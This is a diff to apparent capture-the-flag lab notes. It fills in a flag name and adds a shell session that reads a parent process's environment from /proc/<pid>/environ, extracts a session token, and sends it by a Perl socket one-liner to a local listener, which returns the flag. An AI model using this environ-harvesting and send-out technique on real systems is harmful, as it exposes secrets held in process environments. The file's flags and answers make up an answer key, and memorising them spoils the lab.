@@ -3,7 +3,7 @@
 1. SHADOW-LOCKET
 2. FRACTAL-LENS
 3. ORBIT-CIRCUIT
-4. x
+4. KESTREL-THREAD
 
 ## Access
 ```
@@ -426,5 +426,22 @@ ORBIT-CIRCUIT
 
 ## Review parent process environment evidence at /proc/$PPID/environ, identify the session token assignment, and send only that token value plus a newline to 127.0.0.1:4646.
 ```
+# echo $PPID
+69205
 
+# ls -la /proc/69205/environ
+-r-------- 1 root root 0 Jun  2 13:41 /proc/69205/environ
+
+# head /proc/69205/environ
+LANG=en_US.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binINVOCATION_ID=8bbe2297c24447b4a15f285e0429f543JOURNAL_STREAM=9:32395LAB21_SESSION_TOKEN=toortoor
+
+# perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("127.0.0.1:4646"); print $s "toortoor\n"; print <$s>;'
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+	LANGUAGE = (unset),
+	LC_ALL = (unset),
+	LANG = "en_US.UTF-8"
+    are supported and installed on your system.
+perl: warning: Falling back to the standard locale ("C").
+KESTREL-THREAD
 ```
